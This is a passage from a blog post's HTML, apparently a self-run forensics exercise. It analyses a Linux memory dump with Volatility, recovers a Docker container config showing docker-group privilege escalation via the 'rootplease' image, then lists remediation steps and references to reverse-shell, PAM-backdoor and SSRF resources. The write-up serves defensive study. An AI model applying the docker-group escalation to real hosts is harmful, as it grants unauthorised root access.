+----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.wants
+----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount
+----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts.mount
+----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d.mount
+----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.d
+----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.requires
+----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.wants
+----------------                0x0 /bin/bin/etc/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount
+
+$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796439e5798 -O configv2.json
+
+$ cat configv2.json
+{
+   &quot;StreamConfig&quot;:{
+
+   },
+   &quot;State&quot;:{
+      &quot;Running&quot;:false,
+      &quot;Paused&quot;:false,
+      &quot;Restarting&quot;:false,
+      &quot;OOMKilled&quot;:false,
+      &quot;RemovalInProgress&quot;:false,
+      &quot;Dead&quot;:false,
+      &quot;Pid&quot;:0,
+      &quot;ExitCode&quot;:0,
+      &quot;Error&quot;:&quot;&quot;,
+      &quot;StartedAt&quot;:&quot;2018-12-27T20:35:33.829072671Z&quot;,
+      &quot;FinishedAt&quot;:&quot;2018-12-27T20:38:06.362580759Z&quot;,
+      &quot;Health&quot;:null
+   },
+   &quot;ID&quot;:&quot;7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d&quot;,
+   &quot;Created&quot;:&quot;2018-12-27T20:35:33.445274287Z&quot;,
+   &quot;Managed&quot;:false,
+   &quot;Path&quot;:&quot;/bin/bash&quot;,
+   &quot;Args&quot;:[
+      &quot;exploit.sh&quot;
+   ],
+   &quot;Config&quot;:{
+      &quot;Hostname&quot;:&quot;7a61f3cd00b1&quot;,
+      &quot;Domainname&quot;:&quot;&quot;,
+      &quot;User&quot;:&quot;&quot;,
+      &quot;AttachStdin&quot;:true,
+      &quot;AttachStdout&quot;:true,
+      &quot;AttachStderr&quot;:true,
+      &quot;Tty&quot;:true,
+      &quot;OpenStdin&quot;:true,
+      &quot;StdinOnce&quot;:true,
+      &quot;Env&quot;:[
+         &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;
+      ],
+      &quot;Cmd&quot;:[
+         &quot;/bin/bash&quot;,
+         &quot;exploit.sh&quot;
+      ],
+      &quot;Image&quot;:&quot;chrisfosterelli/rootplease&quot;,
+      &quot;Volumes&quot;:null,
+      &quot;WorkingDir&quot;:&quot;&quot;,
+      &quot;Entrypoint&quot;:null,
+      &quot;OnBuild&quot;:null,
+      &quot;Labels&quot;:{
+
+      }
+   },
+   &quot;Image&quot;:&quot;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&quot;,
+   &quot;NetworkSettings&quot;:{
+      &quot;Bridge&quot;:&quot;&quot;,
+      &quot;SandboxID&quot;:&quot;f5255e73e83536c1ef71277f3341fdc91cdcd2bd22f759093140d8aa5eb16891&quot;,
+      &quot;HairpinMode&quot;:false,
+      &quot;LinkLocalIPv6Address&quot;:&quot;&quot;,
+      &quot;LinkLocalIPv6PrefixLen&quot;:0,
+      &quot;Networks&quot;:{
+         &quot;bridge&quot;:{
+            &quot;IPAMConfig&quot;:null,
+            &quot;Links&quot;:null,
+            &quot;Aliases&quot;:null,
+            &quot;NetworkID&quot;:&quot;0f3242d272897a68f74cdf971e44ef9e0e7ad108758cd8b72698327dcbb97343&quot;,
+            &quot;EndpointID&quot;:&quot;&quot;,
+            &quot;Gateway&quot;:&quot;&quot;,
+            &quot;IPAddress&quot;:&quot;&quot;,
+            &quot;IPPrefixLen&quot;:0,
+            &quot;IPv6Gateway&quot;:&quot;&quot;,
+            &quot;GlobalIPv6Address&quot;:&quot;&quot;,
+            &quot;GlobalIPv6PrefixLen&quot;:0,
+            &quot;MacAddress&quot;:&quot;&quot;,
+            &quot;DriverOpts&quot;:null,
+            &quot;IPAMOperational&quot;:false
+         }
+      },
+      &quot;Service&quot;:null,
+      &quot;Ports&quot;:null,
+      &quot;SandboxKey&quot;:&quot;/var/run/docker/netns/f5255e73e835&quot;,
+      &quot;SecondaryIPAddresses&quot;:null,
+      &quot;SecondaryIPv6Addresses&quot;:null,
+      &quot;IsAnonymousEndpoint&quot;:true,
+      &quot;HasSwarmEndpoint&quot;:false
+   },
+   &quot;LogPath&quot;:&quot;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-json.log&quot;,
+   &quot;Name&quot;:&quot;/amazing_rosalind&quot;,
+   &quot;Driver&quot;:&quot;overlay2&quot;,
+   &quot;OS&quot;:&quot;linux&quot;,
+   &quot;MountLabel&quot;:&quot;&quot;,
+   &quot;ProcessLabel&quot;:&quot;&quot;,
+   &quot;RestartCount&quot;:0,
+   &quot;HasBeenStartedBefore&quot;:true,
+   &quot;HasBeenManuallyStopped&quot;:false,
+   &quot;MountPoints&quot;:{
+      &quot;/hostOS&quot;:{
+         &quot;Source&quot;:&quot;/&quot;,
+         &quot;Destination&quot;:&quot;/hostOS&quot;,
+         &quot;RW&quot;:true,
+         &quot;Name&quot;:&quot;&quot;,
+         &quot;Driver&quot;:&quot;&quot;,
+         &quot;Type&quot;:&quot;bind&quot;,
+         &quot;Propagation&quot;:&quot;rslave&quot;,
+         &quot;Spec&quot;:{
+            &quot;Type&quot;:&quot;bind&quot;,
+            &quot;Source&quot;:&quot;/&quot;,
+            &quot;Target&quot;:&quot;/hostOS&quot;
+         },
+         &quot;SkipMountpointCreation&quot;:false
+      }
+   },
+   &quot;SecretReferences&quot;:null,
+   &quot;ConfigReferences&quot;:null,
+   &quot;AppArmorProfile&quot;:&quot;&quot;,
+   &quot;HostnamePath&quot;:&quot;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostname&quot;,
+   &quot;HostsPath&quot;:&quot;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hosts&quot;,
+   &quot;ShmPath&quot;:&quot;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/shm&quot;,
+   &quot;ResolvConfPath&quot;:&quot;/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf&quot;,
+   &quot;SeccompProfile&quot;:&quot;&quot;,
+   &quot;NoNewPrivileges&quot;:false
+}
+</code></pre>
+
+<p>And that&rsquo;s the tragedy, Odie realizes that an unknown docker has been launched:</p>
+
+<ul>
+<li>Image: chrisfosterelli/rootplease</li>
+<li>Cmd: [&ldquo;/bin/bash&rdquo;, &ldquo;exploit.sh&rdquo;]</li>
+</ul>
+
+<p><center>
+<img src="https://media.giphy.com/media/3o72EYpwsVfqtqccpy/giphy.gif" alt="" />
+</center></p>
+
+<p>After requesting Google about a possibility of gaining <strong>root</strong> access using docker, we found a dockerhub page that explain how your can abuse <code>docker</code> group: <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">https://hub.docker.com/r/chrisfosterelli/rootplease/</a></p>
+
+<p>Finally, the laziness of using sudo every time he needs to use docker will have gotten the better of our little Odie.</p>
+
+<h2 id="attack-scenario">Attack scenario</h2>
+
+<p>According to our analysis, here is the attacker scenario:</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/scenario_1.png" alt="" />
+</center></p>
+
+<h2 id="action-plan">Action plan</h2>
+
+<p>Now that we have done a nice analysis, it&rsquo;s important to mitigate and fix vulnerabilities.</p>
+
+<h3 id="remediation">Remediation</h3>
+
+<ul>
+<li>Remove or move <code>/var/www/html/test.php</code> and <code>/var/www/html/config_test.php</code> files ;</li>
+<li>Removing <strong>odie</strong> from <code>docker</code> group ;</li>
+<li>Removing the PAM backdoor of Monique and restore the legit PAM mechanism ;</li>
+<li>Remove old SSH key pair and generate new SSH keys for <strong>odie</strong> ;</li>
+<li>Add a password on MySQL user <strong>wp_mysql_user</strong> ;</li>
+<li>Allow <strong>wp_mysql_user</strong> to manage only the WordPress database.</li>
+</ul>
+
+<h3 id="improvement">Improvement</h3>
+
+<ul>
+<li>Deport logs to avoid their deletion (voluntary or not). Odie is a good student, he listened to all his courses on Splunk. It will be easy for him ;</li>
+<li>Enable Apache2 POST requests logging ;</li>
+<li>Store commands runs by <strong>www-data</strong> ;</li>
+<li>Change SSH default port ;</li>
+<li>Install an SSH honeypot on the default port.</li>
+</ul>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>To conclude this article, I really enjoyed doing it, I learned a lot of things, whether it was in blue team or red team. The main problem is that my point of view was completely biased since I was both the attacker and the attacked. I should be looking for someone who attacks a machine, makes a memory dump and sends it to me.</p>
+
+<p>Moreover, it&rsquo;s a new system, which has no experience and no interaction with the internet. This system is completely prevented from external noise. This is why to was so &ldquo;easy&rdquo; to find all these artifacts despite the completely poor log configuration.</p>
+
+<p>Some omissions like the docker container for privilege escalation are not done on purpose, I really forgot to delete the container! I realized this during the analysis of the memory dump.</p>
+
+<p>I hope you will have learned some things as readers, and that it will motivate you to do these kinds of little exercises and write about it :D</p>
+
+<p>If you have any questions about this article, advice about the methodology (blue or/and red team) or even just for chatting, feel free to contact me on Twitter: <a href="https://twitter.com/Maki_chaz">Maki Twitter</a>.</p>
+
+<p>Finally, I would like to be clear about the history between Monique and Odie. After all of that, Monique has stopped annoying Odie. They even going to see Aquaman together this weekend! They lived happily ever after and had many children! :)</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="ressources">Ressources</h2>
+
+<ul>
+<li>Nick CONGLETON, <em>How to Install a LAMP Server on Debian 9 Stretch Linux</em>. 21/02/2018. <strong>Linux Config</strong>: <a href="https://linuxconfig.org/how-to-install-a-lamp-server-on-debian-9-stretch-linux">https://linuxconfig.org/how-to-install-a-lamp-server-on-debian-9-stretch-linux</a></li>
+<li>Nick CONGLETON, <em>How to Install WordPress on Debian 9 Stretch Linux</em>. 30/06/2017. <strong>Linux Config</strong>: <a href="https://linuxconfig.org/how-to-install-wordpress-on-debian-9-stretch-linux">https://linuxconfig.org/how-to-install-wordpress-on-debian-9-stretch-linux</a></li>
+<li>xfkxfk@, <em>SSRF To RCE in MySQL</em>. 23/01/2018. <strong>Seebug paper</strong>: <a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></li>
+<li>Guilherme &ldquo;k33r0k&rdquo; Assmann, <em>ISITDTU CTF 2018 - Friss Writeup</em>. 29/07/2018. <strong>FireShell Security team</strong>: <a href="https://fireshellsecurity.team/isitdtu-friss/">https://fireshellsecurity.team/isitdtu-friss/</a></li>
+<li>Officiel PHP website, <em>escapeshellarg</em>. <strong>PHP</strong>: <a href="http://php.net/manual/fr/function.escapeshellarg.php">http://php.net/manual/fr/function.escapeshellarg.php</a></li>
+<li>HollyGraceful, <em>Custom Rules for John the Ripper</em>. 14/09/2015. <strong>GracefulSecurity</strong>: <a href="https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/">https://www.gracefulsecurity.com/custom-rules-for-john-the-ripper/</a></li>
+<li>PentestMonkey, <em>Reverse Shell Cheat Sheet</em>. <strong>PentestMonkey</strong>: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+<li>RopNop, <em>Upgrading simple shells to fully interactive TTYs</em>. 10/07/2017. <strong>RopNop blog</strong>: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></li>
+<li>Python official website, <em>Command lind and environment</em>, <strong>Python officiel website</strong>: <a href="https://docs.python.org/2/using/cmdline.html#envvar-PYTHONINSPECT">https://docs.python.org/2/using/cmdline.html#envvar-PYTHONINSPECT</a></li>
+<li>Chris Foster, <em>Privilege escalation via Docker</em>. 22/04/2015. <strong>fosterelli</strong>: <a href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></li>
+<li>Mitsurugi, <em>Creating a backdoor in PAM in 5 line of code</em>. 16/06/2016. <strong>Mitsurugi blog</strong>: <a href="http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html">http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html</a></li>
+<li>Zephrax, <em>linux-pam-backdoor</em>. 2016. <strong>GitHub</strong>: <a href="https://github.com/zephrax/linux-pam-backdoor">https://github.com/zephrax/linux-pam-backdoor</a></li>
+<li>504ensibsLabs, <em>LiME ~ Linux Memory Extractor</em>. 2018. <strong>GitHub</strong>: <a href="https://github.com/504ensicsLabs/LiME">https://github.com/504ensicsLabs/LiME</a></li>
+<li>Maki, <em>Volatility docker</em>. 2018. <strong>GitLab</strong>: <a href="https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility">https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility</a></li>
+<li>huntergregal, <em>Mimipenguin beta-2.0</em>. 2018. <strong>GitHub</strong>: <a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></li>
+<li>gleeda, <em>Linux command reference</em>. 20/12/2017. <strong>Volatility GitHub</strong>: <a href="https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference">https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference</a></li>
+<li>Wiki, <em>OWASP DirBuster Project</em>. <strong>OWASP Wiki</strong>: <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project</a></li>
+<li>Geluchat, <em>Les Server Side Request Forgery : Comment contourner un pare-feu</em>. 16/09/2017. <strong>DailySecurity</strong>: <a href="https://www.dailysecurity.fr/server-side-request-forgery/">https://www.dailysecurity.fr/server-side-request-forgery/</a></li>
+<li>Swissky, <em>Server-Side Request Forgery</em>. <strong>GitHub</strong>: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SSRF%20injection/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SSRF%20injection/README.md</a></li>
+<li>DFarnier, <em>Débuter WordPress</em>. 01/03/2015. <strong>dfarnier</strong>: <a href="https://dfarnier.fr/base-de-donnees-wordpress-1/?nolazy#les-tables-des-utilisateurs-wp_users-et-wp_usermeta">https://dfarnier.fr/base-de-donnees-wordpress-1/?nolazy#les-tables-des-utilisateurs-wp_users-et-wp_usermeta</a></li>
+<li>chrisfosterelli, <em>chrisfosterelli/rootplease</em>. 2015. <strong>DockerHub</strong>: <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">https://hub.docker.com/r/chrisfosterelli/rootplease/</a></li>
+<li>cowrie, <em>Cowrie SSH/Telnet Honeypot</em>. 2018. <strong>GitHub</strong>: <a href="https://github.com/cowrie/cowrie">https://github.com/cowrie/cowrie</a></li>
+<li>SekioaLab, <em>FastIR Collector Linux</em>. 2017. <strong>GitHub</strong>: <a href="https://github.com/SekoiaLab/Fastir_Collector_Linux">https://github.com/SekoiaLab/Fastir_Collector_Linux</a></li>
+</ul>
+
+	</div>
+</article>
+
+		</div>
+		
+	
+<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
+	
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+	
+
+
+	<script>
+    (function() {
+      var toc = document.getElementById('TableOfContents');
+      if (!toc) return;
+      do {
+        var li, ul = toc.querySelector('ul');
+        if (ul.childElementCount !== 1) break;
+        li = ul.firstElementChild;
+        if (li.tagName !== 'LI') break;
+        
+        ul.outerHTML = li.innerHTML;
+      } while (toc.childElementCount >= 1);
+    })();
+  </script>
+
+	</body>
+</html>
